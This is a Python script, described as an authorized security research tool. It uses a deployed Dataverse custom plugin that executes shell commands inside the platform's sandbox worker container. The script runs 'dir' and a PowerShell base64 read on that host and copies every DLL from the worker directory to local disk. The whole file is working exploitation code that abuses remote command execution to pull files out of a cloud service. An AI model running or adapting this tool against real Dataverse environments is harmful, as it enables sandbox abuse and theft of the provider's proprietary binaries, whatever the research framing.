#!/usr/bin/env python3
"""Extract DLLs from a Dataverse sandbox worker container via EchoPlugin Custom API.

Usage:
    python extract_dlls.py --org-url https://your-org.crm.dynamics.com --token <bearer_token>
    python extract_dlls.py --org-url <url> --token <tok> --worker-dir "C:\\somepath" --output-dir ./out

Authorized security research tool. Requires a valid OAuth token and deployed EchoPlugin.
"""

import argparse
import base64
import json
import os
import sys
import urllib.request
import urllib.error


def call_plugin(org_url, token, api_name, message):
    """POST a message to the EchoPlugin Custom API and return the response field."""
    url = f"{org_url.rstrip('/')}/api/data/v9.2/{api_name}"
    data = json.dumps({"message": message}).encode("utf-8")
    req = urllib.request.Request(url, data=data, method="POST", headers={
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "OData-MaxVersion": "4.0",
        "OData-Version": "4.0",
    })
    try:
        with urllib.request.urlopen(req, timeout=120) as resp:
            body = json.loads(resp.read().decode("utf-8"))
            return body.get("response") or body.get("Response") or ""
    except urllib.error.HTTPError as e:
        err_body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        print(f"  HTTP {e.code}: {err_body[:300]}", file=sys.stderr)
        return None
    except Exception as e:
        print(f"  Error: {e}", file=sys.stderr)
        return None


def list_dlls(org_url, token, api_name, worker_dir):
    """List .dll files in the worker directory."""
    cmd = f'CMD:dir /b "{worker_dir}\\*.dll"'
    result = call_plugin(org_url, token, api_name, cmd)
    if not result:
        return []
    return [f.strip() for f in result.strip().splitlines() if f.strip().lower().endswith(".dll")]


def extract_dll(org_url, token, api_name, worker_dir, dll_name):
    """Read a single DLL as base64 via PowerShell and return decoded bytes."""
    full_path = f"{worker_dir}\\{dll_name}"
    cmd = (
        f'CMD:powershell -c "[Convert]::ToBase64String('
        f"[IO.File]::ReadAllBytes('{full_path}'))\""
    )
    result = call_plugin(org_url, token, api_name, cmd)
    if not result:
        return None
    try:
        cleaned = result.strip().replace("\r", "").replace("\n", "")
        return base64.b64decode(cleaned)
    except Exception as e:
        print(f"  Base64 decode failed for {dll_name}: {e}", file=sys.stderr)
        return None


def main():
    parser = argparse.ArgumentParser(description="Extract DLLs from Dataverse sandbox worker via EchoPlugin")
    parser.add_argument("--org-url", required=True, help="Dataverse org URL")
    parser.add_argument("--token", required=True, help="OAuth bearer token")
    parser.add_argument("--api-name", default="new_EchoMessage", help="Custom API name")
    parser.add_argument("--worker-dir", default="C:\\dataversesandboxworker", help="Remote DLL directory")
    parser.add_argument("--output-dir", default="./extracted_dlls", help="Local output directory")
    args = parser.parse_args()

    os.makedirs(args.output_dir, exist_ok=True)

    print(f"Listing DLLs in {args.worker_dir} ...")
    dlls = list_dlls(args.org_url, args.token, args.api_name, args.worker_dir)
    if not dlls:
        print("No DLLs found or listing failed.", file=sys.stderr)
        sys.exit(1)

    total = len(dlls)
    print(f"Found {total} DLLs. Extracting...\n")
    extracted = 0

    for i, dll_name in enumerate(dlls, 1):
        print(f"[{i}/{total}] {dll_name} ... ", end="", flush=True)
        data = extract_dll(args.org_url, args.token, args.api_name, args.worker_dir, dll_name)
        if data:
            out_path = os.path.join(args.output_dir, dll_name)
            with open(out_path, "wb") as f:
                f.write(data)
            print(f"OK ({len(data)} bytes)")
            extracted += 1
        else:
            print("FAILED")

    print(f"\nDone: {extracted}/{total} DLLs extracted to {args.output_dir}")


if __name__ == "__main__":
    main()
